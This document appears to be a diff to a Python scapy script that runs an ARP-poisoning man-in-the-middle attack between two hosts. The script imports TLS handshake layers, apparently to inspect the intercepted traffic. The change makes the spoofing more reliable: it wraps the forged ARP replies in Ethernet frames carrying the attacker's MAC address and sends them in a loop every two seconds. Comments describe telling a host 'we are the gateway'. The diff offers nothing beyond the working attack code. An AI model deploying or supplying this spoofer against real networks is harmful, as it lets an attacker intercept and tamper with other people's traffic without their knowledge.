@@ -8,7 +8,7 @@ import time
 import threading
 
 from scapy.layers.inet import TCP, UDP, IP
-from scapy.layers.l2 import ARP
+from scapy.layers.l2 import ARP, Ether
 from scapy.layers.tls.handshake import TLSClientHello, TLSServerHello
 from scapy.layers.tls.record import TLS
 
@@ -61,9 +61,13 @@ def get_mac(ip):
         return received.hwsrc
     return None
 
-def poison_arp(victim_ip, victim_mac, spoof_ip):
-    arp_response = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
-    send(arp_response, verbose=False)
+def poison_arp(victim_ip, victim_mac, spoof_ip, attacker_mac):
+    ether = Ether(dst=victim_mac, src=attacker_mac)
+    arp = ARP(op=2, hwsrc=attacker_mac, psrc=spoof_ip,
+              hwdst=victim_mac, pdst=victim_ip)
+    packet = ether / arp
+    sendp(packet, iface=interface, verbose=False)
+
 
 def restore_arp(target_ip, target_mac, source_ip, source_mac):
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
@@ -162,9 +166,10 @@ def main():
 
     print("[*] Beginning ARP poisoning. Press CTRL+C to stop.")
     try:
+        attacker_mac = get_if_hwaddr(interface)
         while True:
-            poison_arp(host1_ip, host1_mac, host2_ip)
-            poison_arp(host2_ip, host2_mac, host1_ip)
+            poison_arp(host1_ip, host1_mac, host2_ip, attacker_mac)  # Tell host1 that we are the gateway
+            poison_arp(host2_ip, host2_mac, host1_ip, attacker_mac)  # Tell gateway that we are host1
             time.sleep(2)
     except KeyboardInterrupt:
         print("\n[!] Cleaning up...")
